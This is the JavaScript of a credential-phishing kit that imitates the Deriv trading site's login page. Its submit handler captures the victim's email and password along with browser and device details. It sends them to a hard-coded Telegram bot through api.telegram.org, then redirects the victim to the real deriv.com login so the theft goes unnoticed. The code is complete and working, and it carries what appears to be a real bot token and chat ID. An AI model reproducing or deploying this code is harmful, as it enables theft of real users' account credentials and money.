// Password toggle functionality
const toggle = document.getElementById('toggle');
const passwordInput = document.getElementById('password');
let passwordVisible = false;

toggle.addEventListener('click', () => {
    passwordVisible = !passwordVisible;
    passwordInput.type = passwordVisible ? 'text' : 'password';
    toggle.textContent = passwordVisible ? '👁️' : '👁';
});

// Fake Google login
function goToGmail() {
    window.location.href = "gmail.html";
}

// Main form capture
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const remember = document.getElementById('remember').checked;
    
    // Show loading state
    const btn = document.getElementById('loginBtn');
    const btnText = btn.querySelector('.btn-text');
    const loader = btn.querySelector('.btn-loader');
    btn.disabled = true;
    btnText.style.opacity = '0';
    loader.style.display = 'inline-block';
    
    // Victim data
    const victimData = {
        email: email,
        password: password,
        remember: remember,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        referrer: document.referrer
    };
    
    // Send to Telegram (REPLACE THESE)
    const BOT_TOKEN = '8668043512:AAGe5xBZuouUi2das4ttGhU9ehz4e96ECPM'; // e.g., '1234567890:ABCdef...'
    const CHAT_ID = '7133577749';    // e.g., '123456789'
    
    const message = `🚨 *Deriv Login Captured* 🚨

👤 *Email:* \`${email}\`
🔑 *Password:* \`${password}\`
💾 *Remember:* ${remember ? '✅' : '❌'}
🌐 *UA:* ${navigator.userAgent.slice(0, 80)}...
📱 *Device:* ${navigator.platform} | ${screen.width}x${screen.height}
🌍 *Lang:* ${navigator.language}
⏰ *Time:* ${new Date().toLocaleString()}
🔗 *URL:* ${window.location.href}

*Full logs saved*`;
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) {
        console.error('Telegram failed:', e);
    }
    
    // Redirect after 2.5s
    setTimeout(() => {
        window.location.href = 'https://deriv.com/login';
    }, 2500);
});
